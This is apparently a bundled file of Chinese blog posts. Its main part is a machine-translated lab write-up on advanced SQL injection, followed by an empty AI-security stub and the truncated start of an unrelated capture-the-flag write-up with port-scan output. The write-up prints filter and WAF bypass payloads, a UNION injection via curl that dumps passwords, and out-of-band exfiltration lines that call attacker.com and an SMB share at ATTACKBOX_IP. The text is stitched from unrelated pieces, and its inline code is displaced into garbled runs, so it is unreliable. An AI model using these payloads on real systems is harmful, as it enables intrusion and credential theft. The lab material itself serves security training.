在上述有效负载中，关闭 SQL 查询中的当前字符串或值。例如，如果查询正在查找与 1 匹配的书名，则 add 将关闭字符串，使 input 的其余部分成为 SQL 语句的一部分。 part 使用 SQL 运算符添加始终为 true 的条件。此条件可确保查询对所有记录返回 true，绕过本应限制结果的原始条件。同样，在 SQL 中启动注释，导致数据库忽略查询的其余部分。这对于终止可能导致语法错误或意外情况的查询的任何剩余部分非常有用。为确保适当的间距，请在注释后添加一个空格，确保注释正确终止并且没有语法问题。\`1'\`\`'\`\`|| 1=1\`\`OR\`\`--\`\`+\`

从控制台中，我们可以看到单击搜索按钮会对 .\`search_book.php\`
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165346.png)

让我们直接在 PHP 页面上使用有效负载，以避免来自客户端的不必要调整/验证。让我们访问具有标准负载的 URL [http://10.10.164.79/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1](http://10.10.164.79/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1)，您将看到一个错误。\`Intro to PHP' OR 1=1\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165415.png)

现在，使用 [Cyber Chef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)) 对负载进行 URL 编码，并尝试使用更新的负载访问 URL。我们将获得以下输出，其中转储完整信息：\`Intro to PHP' || 1=1 --+\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165435.png)

有效负载之所以有效，是因为 URL 编码以绕过筛选机制的方式表示特殊字符和 SQL 关键字。当服务器解码 URL 编码的输入时，它会恢复特殊字符和关键字，从而允许 SQL 注入成功执行。使用 URL 编码，攻击者可以构建绕过旨在阻止 SQL 注入的基本输入过滤机制的有效负载。这证明了使用更强大的防御措施的重要性，例如参数化查询和预编译语句，无论输入的编码如何，它们都可以防止 SQL 注入攻击。

无引号 SQL 注入  

当应用程序过滤单引号或双引号或转义时，使用无引号 SQL 注入技术。  

- **使用数值**：一种方法是使用不需要引号的数值或其他数据类型。例如，攻击者可以在不需要引号的上下文中使用，而不是 injecting 。此技术可以绕过专门查找转义或去除引号的过滤器，从而允许注入继续进行。\`' OR '1'='1\`\`OR 1=1\`
- **使用 SQL 注释**：另一种方法涉及使用 SQL 注释来终止查询的其余部分。例如，可以将输入转换为 ，其中 this 表示 SQL 中注释的开始，从而有效地忽略 SQL 语句的其余部分。这有助于绕过过滤器并防止语法错误。\`admin'--\`\`admin--\`\`--\`
- **使用 CONCAT（） 函数**：攻击者可以使用 SQL 函数等方式构建不带引号的字符串。例如，构造字符串 admin.该函数和类似方法允许攻击者在不直接使用引号的情况下构建字符串，从而使过滤器更难检测和阻止有效负载。\`CONCAT()\`\`CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)\`\`CONCAT()\`

不允许使用空格

当不允许使用空格或过滤掉空格时，可以使用各种技术来绕过此限制。

- **替换空格的注释**：一种常见的方法是使用 SQL 注释 （） 来替换空格。例如，攻击者可以使用 ，而不是 。SQL 注释可以替换查询中的空格，从而允许有效负载绕过删除或阻止空格的过滤器。\`/**/\`\`SELECT * FROM users WHERE name = 'admin'\`\`SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'\`  
    
- **制表符或换行符**：另一种方法是使用制表符 （） 或换行符 （） 代替空格。某些筛选器可能允许这些字符，从而使攻击者能够构造类似于 .此技术可以绕过专门查找空格的筛选器。\`\\t\`\`\\n\`\`SELECT\\t*\\tFROM\\tusers\\tWHERE\\tname\\t=\\t'admin'\`  
    
- **替代字符**：一种有效的方法是使用表示不同类型空格的替代 URL 编码字符，例如 （水平制表符）、（换行符）、（换页）、（回车） 和 （不间断空格）。这些字符可以替换有效负载中的空格。\`%09\`\`%0A\` \`%0C\` \`%0D\`\`%A0\`

实例

在此方案中，我们有一个终端节点，该终端节点根据提供的用户名返回用户详细信息。开发人员已实施过滤器来阻止常见的 SQL 注入关键字，例如 OR、AND 和空格 （%20），以防止 SQL 注入攻击。\`http://10.10.164.79/space/search_users.php?username=?\`  

这是开发者添加的 PHP 过滤。

\`\`\`php
$special_chars = array(" ", "AND", "and" ,"or", "OR" , "UNION", "SELECT");
$username = str_replace($special_chars, '', $username);
$sql = "SELECT * FROM user WHERE username = '$username'";
\`\`\`

如果我们在端点上使用标准有效负载，我们可以看到，即使通过 URL 编码，它也没有工作。\`1%27%20||%201=1%20--+\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165655.png)


SQL 查询显示代码省略了空格。要绕过这些保护，我们可以使用表示不同类型的空格或换行符的 URL 编码字符，例如 （horizontal tab）、 （换行符）。这些字符可以替换空格，并且仍可由 SQL 解析器正确解释。\`%09\`\`%0A\`

可以将原始有效负载修改为使用换行符而不是空格，从而产生有效负载 .此有效负载构造与空格筛选器相同的逻辑条件，但使用换行符来绕过空格筛选器。\`1' OR 1=1 --\`\`1'%0A||%0A1=1%0A--%27+\`\`1' OR 1=1 --\`

SQL 解析器将换行符解释为空格，将有效负载转换为 .因此，查询将从 解释为 。\`1' OR 1=1 --\`\`SELECT * FROM users WHERE username = '$username'\`\`SELECT * FROM users WHERE username = '1' OR 1=1 --\`

现在，如果我们通过更新的有效负载访问终端节点，我们可以查看所有详细信息。

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165703.png)


总而言之，重要的是要了解，在处理旨在防止 SQL 注入攻击的过滤器或 Web 应用程序防火墙 （WAF） 时，没有一种技术可以保证绕过。但是，这里有一些可用于规避这些保护的提示和技巧。下表重点介绍了可用于尝试绕过筛选器和 WAF 的各种技术：

|   |   |   |
|---|---|---|
|**场景**|**描述**|**例**|
|**像 SELECT 这样的关键词被禁止**|通常可以通过更改大小写或添加内联注释来分解 SQL 关键字|SElEcT * FrOm 用户或 SE/**/LECT * FROM/**/users|
|**禁止使用 Space**|使用替代空格字符或注释来替换空格有助于绕过过滤器。|SELECT%0A*%0AFROM%0Ausers 或 SELECT/**/*/**/FROM/**/users|
|**禁止使用 AND、OR 等逻辑运算符**|使用替代逻辑运算符或串联来绕过关键字筛选器。|用户名 = 'admin' & password = 'password' 或用户名 = 'admin'/**/\\|/**/1=1 --|
|**UNION、SELECT 等常见关键字被禁止**|使用等效表示形式（如十六进制或 Unicode 编码）来绕过筛选器。|SElEcT * FROM users 其中用户名 = CHAR（0x61,0x64,0x6D，0x69,0x6E）|
|**禁止使用 OR、AND、SELECT、UNION 等特定关键字**|使用混淆技术通过将字符与字符串函数或注释组合在一起来伪装 SQL 关键字。|SElECT * FROM users WHERE username = CONCAT（'a'，'d'，'m'，'i'，'n'） 或 SElEcT/**/username/**/FROM/**/users|

  

在实际环境中，您应用的查询和筛选关键字的可见性是无法直接实现的。作为渗透测试人员，重要的是要了解 SQL 注入测试通常涉及命中试验方法，需要耐心和毅力。每个环境都可能具有独特的过滤器和保护措施，因此有必要适应并尝试不同的技术来找到成功的注射向量。

# 带外 SQL 注入

带外 （OOB） SQL 注入是一种攻击技术，当直接或传统方法无效时，渗透测试人员/红队成员使用它来泄露数据或执行恶意操作。与攻击者依赖同一通道进行攻击和数据检索的带内 SQL 注入不同，带外 SQL 注入使用单独的通道来发送有效负载和接收响应。带外技术利用 **HTTP** 请求、**DNS** 查询、**SMB** 协议或数据库服务器可能有权访问的其他网络协议等功能，使攻击者能够绕过防火墙、入侵检测系统和其他安全措施。
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165809.png)
带外 SQL 注入的主要优势之一是其隐蔽性和可靠性。通过**使用不同的通信渠道**，攻击者可以最大限度地降低被发现的风险，并与受感染的系统保持持续连接。例如，攻击者可能会注入一个 **SQL 负载，触发数据库服务器向攻击者控制的恶意域发出 DNS 请求**。然后，可以使用响应来提取敏感数据，而无需向监视直接数据库交互的安全机制发出警报。这种方法允许攻击者利用漏洞，即使在攻击者和目标之间的直接连接受到限制或受到审查的复杂网络环境中也是如此。

为什么使用 OOB

在直接响应被清理或受到安全措施限制的情况下，OOB 通道使攻击者能够在没有服务器立即反馈的情况下泄露数据。例如，**存储过程**、**输出编码**和**应用程序级别约束**等安全机制可能会**阻止直接响应**，从而使传统的 SQL 注入攻击无效。带外技术（例如使用 DNS 或 HTTP 请求）允许将数据发送到由攻击者控制的外部服务器，从而规避这些限制。

此外，**入侵检测系统 （IDS）** 和 **Web 应用程序防火墙 （WAF）** 通常会**监控和记录可疑活动的 SQL 查询响应**，从而阻止来自潜在恶意查询的直接响应。通过利用 OOB 通道，攻击者可以通过使用审查较少的网络协议（如 DNS 或 SMB）来传输数据来避免检测。这在攻击者与数据库服务器之间的直接连接受限的网络环境中特别有用，例如当服务器位于防火墙后面或位于不同的网段中时。

不同数据库中的技术

带外 SQL 注入攻击利用通过精心设计的查询写入另一个通信通道的方法。当与数据库的直接交互受到限制时，此技术对于泄露数据或执行恶意操作非常有效。数据库中有多个命令可能允许外泄，但以下是各种数据库系统中最常用的命令列表：

**MySQL 和 MariaDB**

在 MySQL 或 MariaDB 中，可以使用 [SELECT ...INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) 或 [load_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file) 命令。此命令允许攻击者将查询结果写入服务器文件系统上的文件。例如：

\`\`\`php
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
\`\`\`

然后，攻击者可以通过数据库服务器上运行的 SMB 共享或 HTTP 服务器访问此文件，从而通过备用通道泄露数据。

**Microsoft SQL Server （MSSQL）**

在 MSSQL 中，可以使用 [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) 等功能执行带外 SQL 注入，该功能允许直接从 SQL 查询执行 shell 命令。这可用于将数据写入可通过网络共享访问的文件：

\`\`\`php
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\\\10.10.58.187\\logs\\out.txt" -c -T';
\`\`\`

或者， 或者 可用于与外部数据源交互，从而促进通过 OOB 通道进行数据泄露。\`OPENROWSET\`\`BULK INSERT\`  

**神谕**  

在 Oracle 数据库中，可以使用 [UTL_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html) 或 [UTL_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html) 软件包执行带外 SQL 注入。例如，UTL_HTTP 包可用于发送包含敏感数据的 HTTP 请求：

\`\`\`php
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
\`\`\`

带外技术示例

MySQL 和 MariaDB 中的带外 SQL 注入技术可以利用各种网络协议来泄露数据。主要方法包括 DNS 泄露、HTTP 请求和 SMB 共享。根据 MySQL/MariaDB 环境和网络设置的功能，可以应用这些技术中的每一种。  

**HTTP 协议请求**  

通过利用允许 HTTP 请求的数据库功能，攻击者可以将敏感数据直接发送到他们控制的 Web 服务器。此方法利用可以建立出站 HTTP 连接的数据库功能。尽管 MySQL 和 MariaDB 本身不支持 HTTP 请求，但如果数据库配置为允许此类操作，则可以通过外部脚本或用户定义函数 （UDF） 来完成此操作。

首先，需要创建和安装 UDF 以支持 HTTP 请求。此设置很复杂，通常涉及其他配置。示例查询如下所示。\`SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;\`

HTTP 请求泄露可以在 Windows 和 Linux （Ubuntu） 系统上实施，具体取决于数据库对启用 HTTP 请求的外部脚本或 UDF 的支持。

**DNS 解析外泄**

攻击者可以使用 SQL 查询生成带有编码数据的 DNS 请求，这些数据被发送到攻击者控制的恶意 DNS 服务器。此技术绕过基于 HTTP 的监控系统，并利用数据库执行 DNS 查找的能力。

如上所述，MySQL 本身不支持仅通过 SQL 命令生成 DNS 请求，攻击者可能会使用其他方式（例如自定义用户定义函数 （UDF） 或系统级脚本）来执行 DNS 查找。

**SMB （中小型企业）外泄**

SMB 泄露涉及将查询结果写入外部服务器上的 SMB 共享。此技术在 Windows 环境中特别有效，但也可以通过正确的设置在 Linux 系统中进行配置。示例查询如下所示。\`SELECT sensitive_data INTO OUTFILE '\\\\\\\\10.10.162.175\\\\logs\\\\out.txt';\`

由于 Windows 本身支持 SMB/UNC 路径，因此完全支持此功能。Linux （Ubuntu）：虽然直接 UNC 路径更适用于 Windows，但可以使用 Linux 等工具或通过将共享挂载到本地目录来挂载和访问 SMB 共享。在 SQL 查询中直接使用 UNC 路径可能需要额外的设置或脚本来促进交互。\`smbclient\`

实例

在这个实际场景中，我们将演示攻击者如何使用带外 SQL 注入技术从易受攻击的 Web 应用程序中窃取数据。服务器端代码包含一个 SQL 注入漏洞，该漏洞允许攻击者构建一个有效负载，将查询结果写入外部 SMB 共享。当来自数据库的直接响应受到限制或受监视时，这非常有用。

**场景说明**

在这种情况下，我们将在 的 AttackBox 上启用网络共享。此共享可通过网络访问，并允许将其他计算机中的文件写入其中。您可以假设这样一种情况：您遇到了一个易受攻击的系统，并希望将数据转置到另一个网络共享系统。攻击者将利用此共享来带外泄露数据。要获得网络共享，我们将启动 AttackBox 并在终端中执行以下命令：\`ATTACKBOX_IP\\logs\`  

- 使用 导航到目录\`impacket\`\`cd /opt/impacket/examples\`
- 输入命令以启动共享目录的 SMB 服务器。\`python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp\`\`/tmp\`
- 您可以通过输入命令 来访问网络共享的内容。这将允许您连接到网络共享，然后您可以发出命令来列出所有命令。\`smbclient //ATTACKBOX_IP/logs -U guest -N\`\`ls\`

我们有相同的 Web 应用程序，该应用程序具有搜索功能，可以查询访问图书馆的访客。此功能的服务器端代码容易受到 SQL 注入的攻击，您可以在 访问它。\`http://10.10.164.79/oob/search_visitor.php?visitor_name=Tim\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165822.png)
服务器代码如下所示：

\`\`\`php
$visitor_name = $_GET['visitor_name'] ?? '';

$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";

echo "<p>Generated SQL Query: $sql</p>";

// Execute multi-query
if ($conn->multi_query($sql)) {
    do {
        // Store first result set
        if ($result = $conn->store_result()) {
            if ($result->num_rows > 0) {
                while ($row = $result->fetch_assoc()) {
\`\`\`

**重要注意事项**

请务必注意，可以设置 MySQL 系统变量。设置后，此变量包含目录路径名，并且 MySQL 将仅允许将文件写入此指定目录。此安全措施有助于降低未经授权的文件操作的风险。\`secure_file_priv\`

- **设置 secure_file_priv 时**：MySQL 会将 **INTO OUTFILE** 等文件操作限制到指定目录。这意味着攻击者只能将文件写入此目录，从而限制了他们将数据泄露到任意位置的能力。
- **当 secure_file_priv 为空时**：如果变量为空，则 MySQL 不会施加任何目录限制，允许将文件写入 MySQL 服务器进程可访问的任何目录。此配置会带来更高的风险，因为它为攻击者提供了更大的灵活性。\`secure_file_priv\`

攻击者通常没有直接访问权限来检查 secure_file_priv 变量的值。因此，他们必须依靠 hit-and-trial 方法来确定是否可以写入文件以及在何处写入文件，测试各种路径以查看文件操作是否成功。  

**准备 Payload**

为了利用此漏洞，攻击者制作了一个有效负载以注入到参数中。有效负载将设计为执行额外的 SQL 查询，该查询将数据库版本信息写入外部 SMB 共享。\`visitor_name\`  

\`\`\`php
1'; SELECT @@version INTO OUTFILE '\\\\\\\\ATTACKBOX_IP\\\\logs\\\\out.txt'; --
\`\`\`

我们来剖析一下上面的有效负载：

- \`1'\`：关闭 SQL 查询中的原始字符串。
- \`;\`：结束第一个 SQL 语句。
- \`SELECT @@version INTO OUTFILE '\\\\\\\\ATTACKBOX_IP\\\\logs\\\\out.txt';\`：执行一个新的 SQL 语句，该语句检索数据库版本并将其写入位于 \\\\ATTACKBOX_IP\\logs\\out.txt 的 SMB 共享。
- \`--\`：注释原始 SQL 查询的其余部分以防止语法错误。

为了利用有效负载，攻击者将访问在外部 SMB 共享中创建文件的 URL。

要访问该文件，请使用 查看目录中收到的文件，如下所示：\`ls /tmp\`\`/tmp\`  


\`\`\`shell-session
thm@machine$ls /tmp
out.txt
\`\`\`

# 高级 SQL 注入
高级 SQL 注入涉及一系列超越基本攻击的复杂方法。以下是渗透测试人员应注意的一些重要高级技术：

HTTP 协议标头注入

HTTP 标头可以携带用户输入，这些输入可能用于服务器端的 SQL 查询。如果这些输入没有被清理，可能会导致 SQL 注入。该技术涉及操作 HTTP 标头（如 **User-Agent**、**Referer** 或 **X-Forwarded-For**）以注入 SQL 命令。服务器可能会记录这些标头或在 SQL 查询中使用它们。例如，恶意 User-Agent 报头将类似于 . 如果服务器在 SQL 查询中包含 User-Agent 标头而未对其进行清理，则可能会导致 SQL 注入。\`User-Agent: ' OR 1=1; --\`

在此示例中，Web 应用程序将 HTTP 请求的 User-Agent 标头记录到数据库中名为 logs 的表中。应用程序提供了一个终端节点，用于显示 logs 表中的所有记录条目。当用户访问网页时，他们的浏览器会发送一个 User-Agent 标头，用于标识浏览器和操作系统。此标头通常用于日志记录目的或为特定浏览器定制内容。在我们的应用程序中，此 User-Agent 标头入到日志表中，然后可以通过提供的端点进行查看。\`http://10.10.164.79/httpagent/\`

给定终端节点，攻击者可能会尝试将 SQL 代码注入 User-Agent 标头，以利用 SQL 注入漏洞。例如，通过将 User-Agent 标头设置为恶意值（如 ），攻击者会尝试注入 SQL 代码，将 logs 表的结果与 user 表中的敏感数据组合在一起。\`User-Agent: ' UNION SELECT username, password FROM user; --\`

以下是插入日志的服务器端代码。

\`\`\`php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
if ($conn->query($insert_sql) === TRUE) {
    echo "<p class='text-green-500'>New logs inserted successfully</p>";
} else {
    echo "<p class='text-red-500'>Error: " . $conn->error . " (Error Code: " . $conn->errno . ")</p>";
}

$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
..
... 
\`\`\`

User-Agent 值使用 INSERT SQL 语句插入到日志表中。如果插入成功，则会显示一条成功消息。如果在插入过程中出现错误，则会显示包含详细信息的错误消息。
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165929.png)

**准备 Payload**

我们将准备 SQL 有效负载并将其注入 User-Agent 标头，以演示如何通过 HTTP 标头利用 SQL 注入。我们的目标有效负载将是 ' UNION SELECT 用户名，密码 FROM 用户;#. 此有效负载旨在：

- **关闭现有字符串文字**：初始单引号 （） 用于关闭 SQL 查询中的现有字符串文字。\`'\`
- **注入 UNION SELECT 语句**：有效负载的一部分用于从 user 表中检索 username 和 password 列。\`UNION SELECT username, password FROM user;\`
- **Comment out the Rest of the Query**：该字符用于注释掉 SQL 查询的其余部分，确保忽略任何后续 SQL 代码。\`#\`

我们需要将此有效负载作为 HTTP 请求中 User-Agent 标头的一部分发送，以注入此有效负载，这可以使用 **Burp Suite** 或 **cURL** 等工具完成。我们将使用 curl 命令行工具发送带有自定义 User-Agent 标头的 HTTP 请求。打开终端并访问您的命令行界面。 使用以下命令发送带有自定义标头的请求 ：\`User-Agent\`

\`\`\`bash
user@tryhackme$ curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://10.10.164.79/httpagent/ <!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>SQL Injection </title> rel="stylesheet"> </head> <body class="bg-gray-100"> <div class="container mx-auto p-8"> <h1 class="text-4xl font-bold mb-8 text-center">HTTP Logs</h1> <div class="bg-white p-6 rounded-lg shadow-lg"> <p class='text-gray-600 text-sm mb-4'>Generated SQL Query: <span class='text-red-500'>SELECT * FROM logs WHERE user_Agent = '' UNION SELECT username, password FROM user; #'</span></p><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>bob</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>bob@123</span></p></div><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>attacker</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>tesla</span></p></div> </div> </div> </body> </html>
\`\`\`

服务器的响应将显示在终端中。如果 SQL 注入成功，您将在响应中看到提取的数据（用户名和密码）。

利用存储过程

存储过程是存储在数据库中的例程，可以执行各种操作，例如插入、更新或查询数据。虽然存储过程可以帮助提高性能并确保一致性，但如果处理不当，它们也可能容易受到 SQL 注入的影响。

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207170002.png)

存储过程是预编译的 SQL 语句，可以作为单个单元执行。它们存储在数据库中，应用程序可以调用它们来执行特定任务。存储过程可以接受参数，这使它们变得灵活而强大。但是，如果这些参数没有得到适当的清理，它们可能会引入 SQL 注入漏洞。

考虑一个旨在根据用户名检索用户数据的存储过程：

\`\`\`php
CREATE PROCEDURE sp_getUserData
    @username NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(4000)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END
\`\`\`

在此示例中，存储过程将 @username 参数连接到动态 SQL 查询中。这种方法容易受到 SQL 注入的攻击，因为输入没有经过清理。

XML 和 JSON 注入  

解析 XML 或 JSON 数据并在 SQL 查询中使用解析数据的应用程序如果未正确清理输入，则可能容易受到注入。XML 和 JSON 注入涉及将恶意数据注入 XML 或 JSON 结构，然后在 SQL 查询中使用这些数据。如果应用程序直接在 SQL 语句中使用解析的值，则可能会发生这种情况。

\`\`\`php
{
  "username": "admin' OR '1'='1--",
  "password": "password"
}
\`\`\`

如果应用程序直接在 SQL 查询中使用这些值（如 ），则可能会导致注入。\`SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password'\`


QL由于安全措施的实施不当和不同 Web 框架的复杂性，注入仍然是一个常见的威胁_。_自动识别和利用这些漏洞可能具有挑战性，但已经开发了多种工具和技术来帮助简化这一过程。!

识别过程中的主要问题

识别 SQL 注入漏洞涉及多项挑战，类似于识别任何其他服务器端漏洞。以下是关键问题：

- **SQL 查询的动态性质**：SQL 查询可以动态构建，因此难以检测注入点。具有多层逻辑的复杂查询可能会掩盖潜在的漏洞。
- **各种注入点**：SQL 注入可能发生在应用程序的不同部分，包括输入字段、HTTP 标头和 URL 参数。识别所有可能的注入点需要彻底的测试和对应用的全面了解。
- **使用安全措施**：应用程序可以使用准备好的语句、参数化查询和 ORM 框架，这可以防止 SQL 注入。自动化工具必须能够区分安全和不安全的查询构造。
- **上下文特定检测**：在 SQL 查询中使用用户输入的上下文可能差异很大。工具必须适应不同的环境，以准确识别漏洞。

几个重要的工具

安全社区内已经开发了几个著名的工具和项目，以帮助自动查找 SQL 注入漏洞。以下是一些众所周知的工具和 GitHub 存储库，它们提供了检测和利用 SQL 注入的功能：

- **[SQLMap](https://github.com/sqlmapproject/sqlmap)**：SQLMap 是一种开源工具，可自动执行检测和利用 Web 应用程序中的 SQL 注入漏洞的过程。它支持广泛的数据库，并为识别和利用提供了广泛的选项。您可以[在此处](https://tryhackme.com/r/room/sqlmap)了解有关该工具的更多信息。
- **[SQLNinja](https://github.com/xxgrunge/sqlninja)**：SQLNinja 是一种专门用于利用使用 Microsoft SQL Server 作为后端数据库的 Web 应用程序中的 SQL 注入漏洞的工具。它自动执行各个阶段的漏洞利用，包括数据库指纹识别和数据提取。
- [**JSQL 注入**](https://github.com/ron190/jsql-injection)：一个 Java 库，专注于检测 Java 应用程序中的 SQL 注入漏洞。它支持各种类型的 SQL 注入攻击，并提供一系列用于提取数据和控制数据库的选项。
- **[烧烤SQL：](https://github.com/CiscoCXSecurity/bbqsql)** BBQSQL 是一个 Blind SQL Injection 漏洞利用框架，旨在简单且高效地自动利用 Blind SQL Injection 漏洞。

自动识别和利用 SQL 注入漏洞对于维护 Web 应用程序安全至关重要。SQLMap、SQLNinja 和 BBQSQL 等工具为检测和利用这些漏洞提供了强大的功能。但是，重要的是要了解自动化工具的局限性以及手动分析和验证的必要性，以确保全面的安全覆盖。通过将这些工具集成到您的安全工作流程中并遵循输入验证和查询构建的最佳实践，您可以有效降低与 SQL 注入漏洞相关的风险。

# 最佳实践
SQL 注入是一个众所周知且普遍存在的漏洞，多年来一直是 Web 应用程序安全的主要关注点。渗透测试人员在评估期间必须特别注意此漏洞，因为它需要全面了解识别和利用 SQL 注入点的各种技术。同样，安全编码人员必须通过实施强大的输入验证并遵守安全编码实践来防止此类攻击，从而优先考虑保护其应用程序。下面提到了一些最佳实践：

安全编码员

- **参数化查询和预编译语句**：使用参数化查询和预编译语句来确保所有用户输入都被视为数据而不是可执行代码。此技术通过将查询结构与数据分离来帮助防止 SQL 注入。例如，在带有 PDO 的 PHP 中，您可以准备一个语句并绑定参数，这可确保用户输入得到安全处理，就像 .\`$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $username]);\`
- **输入验证和清理**：实施强大的输入验证和清理，以确保输入符合预期格式。验证数据类型、长度和范围，并拒绝任何不符合这些条件的输入。使用 PHP 中的内置函数（如 和）来有效地清理输入。\`htmlspecialchars()\`\`filter_var()\`
- **最低权限原则**：通过向应用程序帐户授予最低必要的数据库权限来应用最低权限原则。避免使用具有管理权限的数据库帐户进行日常操作。这通过限制攻击者对关键数据库功能的访问，将成功的 SQL 注入攻击的潜在影响降至最低。
- **存储过程**：使用存储过程封装和验证 SQL 逻辑。这允许您控制和验证数据库本身内的输入，从而降低 SQL 注入的风险。确保存储过程仅接受经过验证的输入，并且设计为在内部处理输入清理。
- **定期安全审计和代码审查**：定期进行安全审计和代码审查，以识别和解决漏洞。自动化工具可以帮助扫描 SQL 注入风险，但人工审查对于发现细微问题也是必不可少的。定期审核可确保您的安全实践与不断变化的威胁保持同步。

渗透测试器

- **利用特定于数据库的功能**：不同的数据库管理系统 （DBMS） 具有独特的功能和语法。渗透测试人员应该了解目标 DBMS（例如 MySQL、PostgreSQL、Oracle、MSSQL）的细节，以有效地利用这些功能。例如，MSSQL 支持该命令，该命令可用于执行系统命令。\`xp_cmdshell\`
- **利用错误消息**：利用详细的错误消息来深入了解数据库架构和结构。基于错误的 SQL 注入涉及触发应用程序生成错误消息，以揭示有用的信息。例如，使用 1' AND 1=CONVERT（int， （SELECT @@version）） -- 可能会生成泄漏版本信息的错误。
- **绕过 WAF 和过滤器**：测试各种混淆技术以绕过 Web 应用程序防火墙 （WAF） 和输入过滤器。这包括使用混合大小写 （SeLeCt）、串联 （CONCAT（CHAR（83）、CHAR（69）、CHAR（76）、CHAR（69）、CHAR（67）、CHAR（84））） 和替代编码（十六进制、URL 编码）。此外，使用内联注释 （/**/） 和不同的字符编码 （例如 %09、%0A） 可以帮助绕过简单的过滤器。
- **数据库指纹识别**：确定数据库的类型和版本以定制攻击。这可以通过发送特定查询来完成，这些查询根据 DBMS 产生不同的结果。例如，SELECT version（） 适用于 PostgreSQL，而 SELECT @@version适用于 MySQL 和 MSSQL。
- **使用 SQL 注入进行透视**：使用 SQL 注入来透视和利用网络的其他部分。一旦数据库服务器遭到入侵，它就可以用于访问其他内部系统。这可能涉及提取凭证或利用系统之间的信任关系。

高级 SQL 注入测试需要对各种技术有深入的了解，并能够适应不同的环境。渗透测试人员应采用各种方法，从利用特定于数据库的功能到绕过复杂的过滤器，再到彻底评估和利用 SQL 注入漏洞。有条不紊地记录每个步骤可确保对应用程序的安全性进行全面评估。`,U=`---
title: AI安全 
tags: [sec,ai]
categories: []
---

# ai安全概述

# ai安全前景

# ai安全细分

# ai安全应用

# 总结

`,H=`---
title: anonymous
tags:
  - 靶场
  - THM
description:
---
## 题目描述

> 难度：middle
> 描述：
尝试获取两个标志！扎根机器并证明您对基础知识的理解！这是一个面向初学者的虚拟机。获取这两个标志需要一些 Linux 和权限提升方法的基本知识。

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息       |
| --- | ----------- | ------------ |
| IP  | 10.17.5.121 | 10.10.226.88 |
| OS  | kali        | linux        |

## 信息搜集

### 端口扫描

\`\`\`
┌──(leo㉿HACK)-[~]
└─$ naabu -host 10.10.226.88

                  __
  ___  ___  ___ _/ /  __ __
 / _ \\/ _ \\/ _ \\/ _ \\/ // /
/_//_/\\_,_/\\_,_/_.__/\\_,_/

                projectdiscovery.io

[INF] Current naabu version 2.3.1 (outdated)
[INF] Running CONNECT scan with non root privileges
10.10.226.88:445
10.10.226.88:21
10.10.226.88:139
10.10.226.88:22
[INF] Found 4 ports on host 10.10.226.88 (10.10.226.88)

\`\`\`

指纹扫描
\`\`\`
nmap -sCV -p 21,22,139,445 10.10.226.88 --min-rate 10000

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.5.121
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
